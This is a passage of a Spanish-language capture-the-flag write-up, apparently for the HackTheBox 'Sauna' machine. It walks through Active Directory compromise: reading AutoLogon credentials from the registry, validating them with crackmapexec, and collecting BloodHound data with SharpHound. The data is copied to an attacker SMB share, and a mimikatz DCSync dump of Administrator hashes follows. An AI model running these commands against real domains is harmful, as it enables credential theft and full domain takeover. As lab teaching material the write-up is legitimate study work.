&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\F&lt;/span&gt;Smith&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami 
&lt;/span&gt;egotisticalbank&lt;span class=&quot;se&quot;&gt;\f&lt;/span&gt;smith
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a enumerar Usuarios a nivel Local en la Maquina y los guardamos en un archivo.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\F&lt;/span&gt;Smith&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; net &lt;span class=&quot;nb&quot;&gt;users

&lt;/span&gt;User accounts &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------------&lt;/span&gt;
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a subir nuestro scrip winPEASx64.exe para realizar un reconocimiento
Encontramos las siguientes Credenciales para el usuario almacenadas por defecto en el AUTOLOGON:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;svc_loanmgr: Moneymakestheworldgoround!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h1 id=&quot;sacar-las-credenciales-almacenadas-en-el-autologon-windows&quot;&gt;Sacar las credenciales Almacenadas en el Autologon Windows&lt;/h1&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\F&lt;/span&gt;Smith&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; reg query &lt;span class=&quot;s2&quot;&gt;&quot;HKLM&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;OFTWARE&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;icrosoft&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;indows NT&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;urrentversion&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;inlogon&quot;&lt;/span&gt;

HKEY_LOCAL_MACHINE&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows NT&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;urrentversion&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;inlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DefaultDomainName    REG_SZ    EGOTISTICALBANK
    DefaultUserName    REG_SZ    EGOTISTICALBANK&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc_loanmanager
    .......etc... 
    DefaultPassword    REG_SZ    Moneymakestheworldgoround!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a Validar las Credenciales para el user svc_loanmgr con Crackmapexec&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# crackmapexec smb 10.10.10.175 -u svc_loanmgr -p &apos;Moneymakestheworldgoround!&apos; &lt;/span&gt;
SMB         10.10.10.175    445    SAUNA            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:SAUNA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:EGOTISTICAL-BANK.LOCAL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SMB         10.10.10.175    445    SAUNA            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] EGOTISTICAL-BANK.LOCAL&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc_loanmgr:Moneymakestheworldgoround!

&lt;span class=&quot;c&quot;&gt;# crackmapexec winrm 10.10.10.175 -u svc_loanmgr -p &apos;Moneymakestheworldgoround!&apos; &lt;/span&gt;
WINRM       10.10.10.175    5985   SAUNA            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:SAUNA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:EGOTISTICAL-BANK.LOCAL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
WINRM       10.10.10.175    5985   SAUNA            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; http://10.10.10.175:5985/wsman
WINRM       10.10.10.175    5985   SAUNA            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] EGOTISTICAL-BANK.LOCAL&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc_loanmgr:Moneymakestheworldgoround! &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Pwn3d!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Vemos que Tambien tenemos acceso para conectarnos con la Herramienta Evil-winrm al user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc_loanmgr&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# evil-winrm -i 10.10.10.175 -u svc_loanmgr -p &apos;Moneymakestheworldgoround!&apos;      &lt;/span&gt;

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc_loanmgr&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;egotisticalbank&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc_loanmgr
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;haciendo-uso-de-sharphoundps1&quot;&gt;Haciendo Uso de SharpHound.ps1&lt;/h1&gt;
&lt;p&gt;Procedemos a enumerar el sistema a nivel de Active Directory con la herramienta SharpHound.ps1
Nos descargamos SharpHound.ps1 haciendo un wget a –&amp;gt; https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1
Grepeando por la funcion&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# grep &quot;Invoke-BloodHound&quot; SharpHound.ps1&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;Invoke-BloodHound&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        PS C:&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; Invoke-BloodHound &lt;span class=&quot;nt&quot;&gt;-Loop&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-LoopInterval&lt;/span&gt; 00:01:00 &lt;span class=&quot;nt&quot;&gt;-LoopDuration&lt;/span&gt; 00:10:00
  &lt;span class=&quot;s2&quot;&gt;&quot;     PS C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; Invoke-BloodHound -CollectionMethod All &quot;&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; esta es la que usaremos
        PS C:&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; Invoke-BloodHound &lt;span class=&quot;nt&quot;&gt;-CollectionMethod&lt;/span&gt; DCOnly &lt;span class=&quot;nt&quot;&gt;-NoSaveCache&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-RandomizeFilenames&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-EncryptZip&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a subirlo a la maquina victima a la siguiente ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C://Windows/Temp/Privesc/&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc_loanmgr&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;C://Windows/Temp/Privesc
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt; upload SharpHound.ps1
Info: Uploading SharpHound.ps1 to C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;harpHound.ps1

Progress: 43% : |▓▓▓▒░░░░░░

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir
    &lt;/span&gt;Directory: C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc

Mode                LastWriteTime         Length Name
&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;         1/4/2022   2:13 PM         974235 SharpHound.ps1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Una vez subido Procedemos a hacer lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt; Import-Module .&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;harpHound.ps1

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt; Invoke-BloodHound &lt;span class=&quot;nt&quot;&gt;-CollectionMethod&lt;/span&gt; All

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir


    &lt;/span&gt;Directory: C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc


Mode                LastWriteTime         Length Name
&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;         1/4/2022   2:15 PM           9067 20220104141535_BloodHound.zip
&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;         1/4/2022   2:13 PM         974235 SharpHound.ps1
&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;         1/4/2022   2:15 PM          11122 ZDFkMDEyYjYtMmE1ZS00YmY3LTk0OWItYTM2OWVmMjc5NDVk.bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Ahora procedemos a iniciar el servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;neo4j console&lt;/code&gt; en una terminal ~ Nos logueamos con nuestras Credenciales
Ahora procedemos a iniciar el servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BloodHound &amp;amp;&amp;gt;/dev/null &amp;amp;&lt;/code&gt; para subir el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.zip&lt;/code&gt; que acabamos de crear con la expresion anterior atraves del modulo SharpHound&lt;/p&gt;

&lt;p&gt;Antes de subir el archivo al BloodHound sofware tenemos que pasarnoslo a nuestra maquina, para ello nos creamos un recurso compartido con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Impacket-smbserver&lt;/code&gt; y nos sincronizamos 
con el recurso compartido que acabamos de crear desde la maquina victima:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt; net use x: &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;10.10.16.7&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;mbFolder
The &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;completed successfully.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# impacket-smbserver smbFolder $(pwd) -smb2support                                                                                                                                                           1 ⚙&lt;/span&gt;
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Callback added &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Callback added &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Incoming connection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.175,49885&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; AUTHENTICATE_MESSAGE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\,&lt;/span&gt;SAUNA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; User SAUNA&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;authenticated successfully
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; :::00::aaaaaaaaaaaaaaaa
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Connecting Share&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1:IPC&lt;span class=&quot;nv&quot;&gt;$)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Connecting Share&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2:smbFolder&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez ya tenemos el Recurso x: o smbFolder seteado procedemos a pasarnos el archivo .zip&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt; copy 20220104141535_BloodHound.zip x:&lt;span class=&quot;se&quot;&gt;\2&lt;/span&gt;0220104141535_BloodHound.zip
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Listo, Ya tendriamos nuestro archivo en nuestra maquina Atacante, preparado para subirlo al BloodHound.&lt;/p&gt;

&lt;h1 id=&quot;bloodhound---getchangesall---dcsynck-attack&quot;&gt;BloodHound - GetChangesAll - DCSynck Attack&lt;/h1&gt;
&lt;p&gt;Con el BloodHound Activo y chequeando por posibles formas de llegar al DC, pinchamos en la forma de realizar un 
DCSYnc Attack y enumeramos la siguiente informacion:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;El usuario &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;svc_loanmgr&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; tiene como privilegios &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;GetChanges-All&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; &amp;amp; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;GetChanges&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; sobre El dominio &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;Egotistical-bank.local&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Pinchamos sobre como podemos abusar de esto y vemos una potencial forma de realizar con mimikatz.exe un DCSynck 
Procedemos a subir el archivito &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mimikatz.exe&lt;/code&gt; y realizar el DCSynck Attack:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt;&lt;span class=&quot;s2&quot;&gt;&quot; C://Windows/Temp/Privesc/mimikatz.exe &apos;lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:Administrator&apos; exit&quot;&lt;/span&gt;

  .#####.   mimikatz 2.2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#19041 Sep 18 2020 19:18:29&lt;/span&gt;
 .## ^ &lt;span class=&quot;c&quot;&gt;##.  &quot;A La Vie, A L&apos;Amour&quot; - (oe.eo)&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;## \ / ##       &amp;gt; https://blog.gentilkiwi.com/mimikatz&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&apos;## v ##&apos;&lt;/span&gt;       Vincent LE TOUX             &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; vincent.letoux@gmail.com &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;s1&quot;&gt;&apos;#####&apos;&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; https://pingcastle.com / https://mysmartlogon.com &lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;/

mimikatz&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;commandline&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:Administrator&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DC] &lt;span class=&quot;s1&quot;&gt;&apos;EGOTISTICAL-BANK.LOCAL&apos;&lt;/span&gt; will be the domain
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DC] &lt;span class=&quot;s1&quot;&gt;&apos;SAUNA.EGOTISTICAL-BANK.LOCAL&apos;&lt;/span&gt; will be the DC server
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DC] &lt;span class=&quot;s1&quot;&gt;&apos;Administrator&apos;&lt;/span&gt; will be the user account

Object RDN           : Administrator

&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; SAM ACCOUNT &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;

SAM Username         : &lt;span class=&quot;s2&quot;&gt;&quot;Administrator&quot;&lt;/span&gt;
Account Type         : 30000000 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; USER_OBJECT &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
User Account Control : 00010200 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; NORMAL_ACCOUNT DONT_EXPIRE_PASSWD &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Account expiration   :
Password last change : 7/26/2021 8:16:16 AM
Object Security ID   : S-1-5-21-2966785786-3096785034-1186376766-500
Object Relative ID   : 500

Credentials:
 &lt;span class=&quot;s2&quot;&gt;&quot; Hash NTLM: 823452073d75b9d1cf70ebdf86c7f98e&quot;&lt;/span&gt;
    ntlm- 0: 823452073d75b9d1cf70ebdf86c7f98e
    ntlm- 1: d9485863c1e9e05851aa40cbb4ab9dff
    ntlm- 2: 7facdc498ed1680c4fd1448319a8c04f
    lm  - 0: 365ca60e4aba3e9a71d78a3912caf35c
    lm  - 1: 7af65ae5e7103761ae828523c7713031

Supplemental Credentials:
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Primary:NTLM-Strong-NTOWF &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
    Random Value : 716dbadeed0e537580d5f8fb28780d44

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Primary:Kerberos-Newer-Keys &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
    Default Salt : EGOTISTICAL-BANK.LOCALAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4096&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : 42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
      aes128_hmac       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4096&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : a9f3769c592a8a231c3c972c4050be4e
